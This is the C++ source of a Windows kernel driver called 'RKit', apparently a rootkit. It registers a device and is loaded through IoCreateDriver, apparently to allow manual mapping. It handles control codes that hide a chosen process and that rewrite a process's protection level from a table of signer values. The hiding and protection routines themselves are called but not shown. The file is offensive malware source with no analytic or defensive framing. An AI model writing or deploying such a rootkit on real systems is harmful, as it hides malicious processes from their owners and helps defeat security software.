#include "Features.h"

NTSTATUS CreateClose(PDEVICE_OBJECT deviceObject, PIRP irp);
NTSTATUS IOControl(PDEVICE_OBJECT deviceObject, PIRP irp);

extern EX_PUSH_LOCK pLock;

extern "C"
NTSTATUS TrueMain(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {

	UNREFERENCED_PARAMETER(RegistryPath);
	
	NTSTATUS status;
	PDEVICE_OBJECT deviceObject;
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\RKit");
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\RKit");

	ExInitializePushLock(&pLock);

	InializeOffsets();
	
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, METHOD_BUFFERED, false, &deviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("[-] Device cannot be created!\n"));
		return status;
	}

	KdPrint(("[+] Device is created successfully!\n"));

	status = IoCreateSymbolicLink(&symLink, &deviceName);

	if (!NT_SUCCESS(status)) {
		KdPrint(("[-] Symbolic Link cannot be created!\n"));
		IoDeleteDevice(deviceObject);
		return status;
	}

	SetFlag(deviceObject->Flags, DO_BUFFERED_IO);

	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IOControl;

	ClearFlag(deviceObject->Flags, DO_DEVICE_INITIALIZING);

	KdPrint(("[+] Driver created successfully!\n"));

	return status;

}


extern "C"
NTSTATUS DriverEntry() {

	KdPrint(("[+] Driver is loaded.\n"));
	
	UNICODE_STRING driverName = RTL_CONSTANT_STRING(L"\\Driver\\RKit");
	
	return IoCreateDriver(&driverName, &TrueMain);

}

NTSTATUS CreateClose(PDEVICE_OBJECT deviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(deviceObject);

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS IOControl(PDEVICE_OBJECT deviceObject, PIRP irp) {
	UNREFERENCED_PARAMETER(deviceObject);

	PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(irp);

	NTSTATUS status = STATUS_SUCCESS;
	int recMsg = 0;
	ProtectLevel change_level;

	__try {

		switch (pStack->Parameters.DeviceIoControl.IoControlCode)
		{
			case HIDE_PROC:
			{
				if (pStack->Parameters.DeviceIoControl.InputBufferLength < sizeof(int)) {
					KdPrint(("[-] Received buffer is too small!\n"));
					status = STATUS_BUFFER_TOO_SMALL;
					break;
				}

				RtlCopyMemory(&recMsg, irp->AssociatedIrp.SystemBuffer, sizeof(int));

				KdPrint(("[?] Process is hiding...\n"));
				status = HideProcess(recMsg);

				break;

			}

			case CHNG_PROT:

				BYTE suitableProtLvl;

				if (pStack->Parameters.DeviceIoControl.InputBufferLength < 2 * sizeof(int)) {
					KdPrint(("[-] Received buffer is too small!\n"));
					status = STATUS_BUFFER_TOO_SMALL;
					break;
				}

				RtlCopyMemory(&change_level, irp->AssociatedIrp.SystemBuffer, 2 * sizeof(int));

				KdPrint(("[?] Selected Protection Level is %d\n", change_level.protLevel));

				switch (change_level.protLevel)
				{
				case 0:
					suitableProtLvl = 0x72;
					break;
				case 1:
					suitableProtLvl = 0x62;
					break;
				case 2:
					suitableProtLvl = 0x52;
					break;
				case 3:
					suitableProtLvl = 0x12;
					break;
				case 4:
					suitableProtLvl = 0x61;
					break;
				case 5:
					suitableProtLvl = 0x51;
					break;
				case 6:
					suitableProtLvl = 0x41;
					break;
				case 7:
					suitableProtLvl = 0x31;
					break;
				case 8:
					suitableProtLvl = 0x11;
					break;
				default:
					suitableProtLvl = 0x0;
					break;
				}
				
				status = ChangeProtectionLevel(change_level.pid, suitableProtLvl);

				break;

			default:
			{
				KdPrint(("[-] Invalid buffer received!\n"));
				status = STATUS_INVALID_DEVICE_REQUEST;
				break;
			}
		}

	}
	__except(GetExceptionCode() == STATUS_ACCESS_VIOLATION
		? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) 
	{
		if (GetExceptionCode() == STATUS_ACCESS_VIOLATION) {
			KPROCESSOR_MODE prevMode = ExGetPreviousMode();

			if (prevMode == UserMode) {
				KdPrint(("[-] Client-side error has occured!\n"));
			}
		}
		else
		{
			status = GetExceptionCode();
		}
		
	}

	RtlCopyMemory(irp->AssociatedIrp.SystemBuffer, &recMsg, sizeof(int));
	
	irp->IoStatus.Status = status;
	irp->IoStatus.Information = sizeof(int);
	IoCompleteRequest(irp, IO_NO_INCREMENT);

	return status;
}
